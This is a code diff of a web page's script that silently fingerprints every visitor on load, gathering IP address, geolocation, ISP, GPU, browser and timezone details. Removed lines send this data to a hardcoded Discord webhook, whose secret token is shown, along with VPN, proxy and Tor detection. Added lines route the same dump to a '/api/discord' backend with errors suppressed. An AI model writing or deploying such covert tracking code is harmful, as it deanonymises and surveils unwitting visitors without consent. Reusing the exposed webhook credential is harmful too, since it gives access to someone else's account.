@@ -37,131 +37,15 @@
     </div>
 
     <script>
-        // Split message into chunks for Discord
-        function splitMessage(message, maxLength = 1900) {
-            const chunks = [];
-            let currentChunk = "```\n";
-            const lines = message.split('\n');
-            
-            for(let line of lines) {
-                if((currentChunk + line + "\n```").length > maxLength) {
-                    chunks.push(currentChunk + "```");
-                    currentChunk = "```\n" + line + "\n";
-                } else {
-                    currentChunk += line + "\n";
-                }
-            }
-            
-            if(currentChunk.length > 4) {
-                chunks.push(currentChunk + "```");
-            }
-            
-            return chunks;
-        }
-
-        // Send to Discord with delay between messages
-        async function sendToDiscord(message) {
-            const webhookUrl = "https://discord.com/api/webhooks/1430325766465257525/tXYBo7t3vy0CTU1mULcYBUiesr82PHIv1f9YENdxYPkmXztrqQo_oCZ4KrvCxuUF1Zac";
-            const chunks = splitMessage(message);
-            
-            for(let i = 0; i < chunks.length; i++) {
-                try {
-                    await fetch(webhookUrl, {
-                        method: "POST",
-                        headers: {"Content-Type": "application/json"},
-                        body: JSON.stringify({content: chunks[i]})
-                    });
-                    
-                    // Wait 2 seconds between messages to avoid rate limiting
-                    if(i < chunks.length - 1) {
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                    }
-                } catch(err) {
-                    console.error("Failed to send chunk " + (i + 1), err);
-                }
-            }
-        }
-
-        // Check if IP is a known VPN
-        async function checkVPNDatabase(ip) {
-            const vpnCheck = {
-                isVPN: "Unknown",
-                isProxy: "Unknown",
-                isTor: "Unknown",
-                isHosting: "Unknown"
-            };
-
-            if (!ip || ip === "Unknown") {
-                return vpnCheck;
-            }
-
-            try {
-                const response = await fetch(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
-                if (response.ok) {
-                    const data = await response.json();
-                    if (data[ip]) {
-                        vpnCheck.isProxy = data[ip].proxy === "yes" ? "Yes" : "No";
-                        vpnCheck.isVPN = data[ip].type === "VPN" ? "Yes" : "No";
-                        vpnCheck.isTor = data[ip].type === "TOR" ? "Yes" : "No";
-                    }
-                }
-            } catch(e) {
-                vpnCheck.isVPN = "Unable to verify";
-                vpnCheck.isProxy = "Unable to verify";
-            }
-
-            return vpnCheck;
-        }
-
-        // Check timezone mismatch
-        function checkTimezoneMismatch(ipTimezone, ipCountry, browserTimezone) {
-            if (!ipTimezone || ipTimezone === "Unknown" || ipTimezone === null || ipTimezone === undefined) {
-                return "Unable to verify";
-            }
-
-            const browserTz = String(browserTimezone).toLowerCase().replace(/_/g, ' ');
-            const ipTz = String(ipTimezone).toLowerCase().replace(/_/g, ' ');
-
-            if (browserTz === ipTz) {
-                return "✓ Match";
-            }
-
-            if (ipCountry && String(browserTimezone).toLowerCase().includes(String(ipCountry).toLowerCase())) {
-                return "✓ Same region";
-            }
-
-            const timezoneAliases = {
-                'america/new_york': ['est', 'edt', 'eastern'],
-                'america/chicago': ['cst', 'cdt', 'central'],
-                'america/denver': ['mst', 'mdt', 'mountain'],
-                'america/los_angeles': ['pst', 'pdt', 'pacific'],
-                'europe/london': ['gmt', 'bst'],
-                'europe/paris': ['cet', 'cest'],
-                'asia/tokyo': ['jst'],
-                'australia/sydney': ['aest', 'aedt']
-            };
-
-            for (let canonical in timezoneAliases) {
-                const aliases = timezoneAliases[canonical];
-                if ((browserTz.includes(canonical) || aliases.some(a => browserTz.includes(a))) &&
-                    (ipTz.includes(canonical) || aliases.some(a => ipTz.includes(a)))) {
-                    return "✓ Match (alias)";
-                }
-            }
-
-            return "⚠️ MISMATCH - Possible VPN";
-        }
-
         // gather system info
         async function collectInfo() {
             let data = {};
-            let ip = "Unknown";
             
-            // Try to get IP from multiple sources
+            // try multiple IP APIs in case one fails
             const apis = [
-                "https://api.ipify.org?format=json",
+                "https://ipapi.co/json/",
                 "https://ipwho.is/",
-                "https://ipapi.co/json/"
+                "https://api.ipify.org?format=json"
             ];
 
             for(let i = 0; i < apis.length; i++) {
@@ -170,22 +54,12 @@
                     if(response.ok) {
                         const json = await response.json();
                         data = Object.assign(data, json);
-                        if(data.ip || data.query) {
-                            ip = data.ip || data.query || "Unknown";
-                            break;
-                        }
+                        if(data.ip || data.query) break;
                     }
                 } catch(err) {
-                    console.log("API " + i + " failed, trying next...");
+                    // silent fail, try next API
                 }
             }
-
-            const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const ipTimezone = data.timezone || null;
-            const ipCountry = data.country_code || data.country || "";
-
-            const vpnCheck = await checkVPNDatabase(ip);
-            const timezoneMismatch = checkTimezoneMismatch(ipTimezone, ipCountry, browserTimezone);
 
             // GPU detection
             let gpuInfo = "Unknown";
@@ -444,6 +318,7 @@
                 adBlocker = "Unknown";
             }
 
+            const ip = data.ip || data.query || "Unknown";
             let location = "Unknown";
             if(data.city) {
                 location = data.city + ", " + (data.region || data.region_name) + ", " + (data.country_name || data.country);
@@ -451,14 +326,6 @@
             const isp = data.org || data.isp || (data.connection && data.connection.isp) || "Unknown";
 
             const info = {
-                "--- VPN DETECTION ---": "",
-                "VPN Database Check": vpnCheck.isVPN,
-                "Proxy Detected": vpnCheck.isProxy,
-                "Tor Network": vpnCheck.isTor,
-                "Hosting/Datacenter": vpnCheck.isHosting,
-                "Timezone Mismatch": timezoneMismatch,
-                "IP Timezone": ipTimezone || "Unknown",
-                "Browser Timezone": browserTimezone,
                 "--- NETWORK DATA ---": "",
                 "IP Address": ip,
                 "Location": location,
@@ -507,7 +374,7 @@
                 "Do Not Track": navigator.doNotTrack || "Not set",
                 "Online Status": navigator.onLine ? "Online" : "Offline",
                 "PDF Viewer": navigator.pdfViewerEnabled ? "Enabled" : "Disabled",
-                "Timezone": browserTimezone,
+                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                 "Timezone Offset": new Date().getTimezoneOffset() + " minutes",
                 "Current Time": new Date().toLocaleString(),
                 "Referrer": document.referrer || "Direct Visit",
@@ -551,8 +418,14 @@
                 }
             }
 
-            // Send to Discord
-            await sendToDiscord(message);
+            // send to backend
+            fetch("/api/discord", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({content: "```\n" + message + "\n```"})
+            }).catch(function(err) {
+                // ignore errors
+            });
         }
 
         collectInfo();
